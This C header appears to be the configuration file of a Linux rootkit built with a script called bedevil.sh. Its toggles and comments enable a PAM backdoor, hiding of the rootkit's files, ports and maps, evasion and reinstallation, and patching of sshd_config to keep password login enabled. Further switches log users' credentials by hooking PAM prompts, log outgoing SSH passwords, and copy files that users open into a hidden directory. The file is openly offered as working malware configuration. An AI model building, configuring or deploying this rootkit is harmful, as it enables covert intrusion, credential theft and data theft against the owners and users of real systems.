#ifndef TOGGLES_H
#define TOGGLES_H

/*
 * you can manually define or undefine these following toggles, or allow
 * bedevil.sh to make the changes for you.
 * `./bedevil.sh -t` will allow you to switch these toggles without editing
 * the file manually.

 * if you want a toggle to be ignored by toggles.sh, just put '//ignore'
 * at the end of the line.
 *     i.e.: '#define RANDOM_TOGGLE //ignore'
 */

/* LOG_SSH is by default disabled and ignored atm as it's
 * causing problems. */

/* requires PAM */
#define USE_PAM_BD

/* all of the essential presence hiding toggles are ignored... */
#define HIDE_SELF //ignore
#define FORGE_MAPS //ignore
#define HIDE_PORTS //ignore
#define DO_REINSTALL //ignore
#define DO_EVASIONS //ignore


/* the magic GID will not be a static value. there are backdoor commands
 * available for refreshing the rootkit's current GID & subsequently rehiding
 * its files.
 *
 * files you have personally created that do not technically belong to the
 * rootkit will not be rehidden. if i discover a way of efficiently & sanely
 * keeping track of files created (by you) in the backdoor then great. until
 * then this will continue to be the way it is.
 *
 * if the file cannot be read for whatever reason, the original (MAGIC_GID)
 * value will be used instead.. if this is the case, should rootkit files need
 * rehidden due to GID changes, that will be handled. */
#define READ_GID_FROM_FILE

/* change the rootkit GID every minimum of GID_CHANGE_MINTIME seconds.
 * the GID will not be changed if rootkit processes are still running.
 * otherwise there is a chance we may be discovered. */
#define AUTO_GID_CHANGER
#define GID_CHANGE_MINTIME 60 * 30 // change GID at least every 30 mins.

/* for use with USE_PAM_BD. makes sure UsePAM & PasswordAuthentication
 * stay enabled on the box's sshd_config. */
#define PATCH_SSHD_CONFIG


/* this defines whether or not a backdoor user can hide & unhide
 * files on-the-fly via the exec hooks. (execve & execvp)
 * absolutely useless without HIDE_SELF.
 *
 * turns out that I had an 'unhide-self' feature in here the entire
 * time & just forgot to keep note of that fact anywhere, so naturally I forgot.
 * this also determines whether or not that feature will be available. */
#define BACKDOOR_UTIL //ignore

/* requires PAM. logs successful user authentications by hooking
 * the pam_prompt functions and writing respective user credentials
 * to the determined log file. */
#define LOG_LOCAL_AUTH

/* when this is defined, outgoing ssh connections are logged.
 * the respective host, username and password used are written to
 * the log. you can read this log file in your installation directory.
 * totally disable this for the time being... */
#undef LOG_SSH //ignore

/* when this is defined, files opened by open and fopen
 * are copied to INTEREST_DIR.
 * the files that are of interest to us are defined in
 * hooks/open/char_arrays. */
#define FILE_STEAL
/* when this is defined w/ FILE_STEAL, when an attempt to
 * steal a file by copying it to its new path fails,
 * attempt to make a new link in the interesting dir for
 * it instead. i would personally discourage using this
 * but it's here anyway... */
#undef LINK_IF_ERR //ignore

#define USE_CRYPT //ignore

#endif
